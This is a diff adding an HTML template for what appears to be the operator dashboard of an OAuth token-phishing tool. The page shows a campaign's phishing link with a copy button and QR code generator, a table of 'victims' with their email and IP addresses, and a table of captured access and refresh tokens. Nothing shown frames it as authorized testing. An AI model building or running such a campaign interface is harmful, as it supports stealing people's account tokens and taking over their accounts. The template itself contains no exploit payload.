@@ -1,0 +1,144 @@
+{% extends "base.html" %}
+
+{% block title %}Campaign Details{% endblock %}
+
+{% block content %}
+<div class="row mt-4">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header">
+                <i class="fas fa-info-circle"></i> {{ campaign.name }}
+                <a href="{{ url_for('campaigns') }}" class="btn btn-sm btn-secondary float-end">Back to Campaigns</a>
+            </div>
+            <div class="card-body">
+                <div class="row">
+                    <div class="col-md-6">
+                        <h5>Campaign Info</h5>
+                        <p><strong>Name:</strong> {{ campaign.name }}</p>
+                        <p><strong>Description:</strong> {{ campaign.description or 'N/A' }}</p>
+                        <p><strong>Status:</strong> 
+                            {% if campaign.status == 'active' %}
+                                <span class="badge bg-success">Active</span>
+                            {% elif campaign.status == 'paused' %}
+                                <span class="badge bg-warning">Paused</span>
+                            {% else %}
+                                <span class="badge bg-secondary">{{ campaign.status }}</span>
+                            {% endif %}
+                        </p>
+                        <p><strong>Created:</strong> {{ campaign.created_at.strftime('%Y-%m-%d %H:%M') }}</p>
+                    </div>
+                    <div class="col-md-6">
+                        <h5>Phishing Link</h5>
+                        <div class="input-group">
+                            <input type="text" class="form-control" id="phishingUrl" value="{{ campaign.phishing_url }}" readonly>
+                            <button class="btn btn-outline-primary" onclick="copyUrl()">
+                                <i class="fas fa-copy"></i>
+                            </button>
+                        </div>
+                        <button class="btn btn-sm btn-outline-success mt-2" onclick="generateQR({{ campaign.id }})">
+                            <i class="fas fa-qrcode"></i> Generate QR Code
+                        </button>
+                        <div id="qrContainer" class="mt-2" style="display:none;">
+                            <img id="qrImage" src="" alt="QR Code">
+                        </div>
+                    </div>
+                </div>
+                <hr>
+                <h5>Victims ({{ victims|length }})</h5>
+                <div class="table-responsive">
+                    <table class="table table-sm">
+                        <thead>
+                            <tr>
+                                <th>Email</th>
+                                <th>IP</th>
+                                <th>Status</th>
+                                <th>First Seen</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            {% for victim in victims %}
+                            <tr>
+                                <td>{{ victim.email or 'Unknown' }}</td>
+                                <td>{{ victim.ip_address or 'N/A' }}</td>
+                                <td>
+                                    {% if victim.status == 'authorized' %}
+                                        <span class="badge bg-success">Authorized</span>
+                                    {% else %}
+                                        <span class="badge bg-warning">{{ victim.status }}</span>
+                                    {% endif %}
+                                </td>
+                                <td>{{ victim.first_seen.strftime('%Y-%m-%d %H:%M') }}</td>
+                            </tr>
+                            {% else %}
+                            <tr><td colspan="4" class="text-center text-muted">No victims</td></tr>
+                            {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+                <hr>
+                <h5>Captured Tokens ({{ tokens|length }})</h5>
+                <div class="table-responsive">
+                    <table class="table table-sm">
+                        <thead>
+                            <tr>
+                                <th>ID</th>
+                                <th>Victim</th>
+                                <th>Access Token</th>
+                                <th>Refresh Token</th>
+                                <th>Captured</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            {% for token in tokens %}
+                            <tr>
+                                <td>{{ token.id }}</td>
+                                <td>
+                                    {% if token.victim %}
+                                        {{ token.victim.email or 'Unknown' }}
+                                    {% else %}
+                                        N/A
+                                    {% endif %}
+                                </td>
+                                <td><code>{{ token.access_token[:20] if token.access_token else 'N/A' }}...</code></td>
+                                <td>
+                                    {% if token.refresh_token %}
+                                        <span class="badge bg-success">Yes</span>
+                                    {% else %}
+                                        <span class="badge bg-secondary">No</span>
+                                    {% endif %}
+                                </td>
+                                <td>{{ token.captured_at.strftime('%Y-%m-%d %H:%M') }}</td>
+                            </tr>
+                            {% else %}
+                            <tr><td colspan="5" class="text-center text-muted">No tokens captured</td></tr>
+                            {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block extra_js %}
+<script>
+function copyUrl() {
+    const url = document.getElementById('phishingUrl');
+    url.select();
+    document.execCommand('copy');
+    alert('URL copied!');
+}
+
+function generateQR(campaignId) {
+    fetch(`/campaign/${campaignId}/generate-qr`)
+        .then(r => r.json())
+        .then(data => {
+            if (data.qr_code) {
+                document.getElementById('qrImage').src = 'data:image/png;base64,' + data.qr_code;
+                document.getElementById('qrContainer').style.display = 'block';
+            }
+        });
+}
+</script>
+{% endblock %}
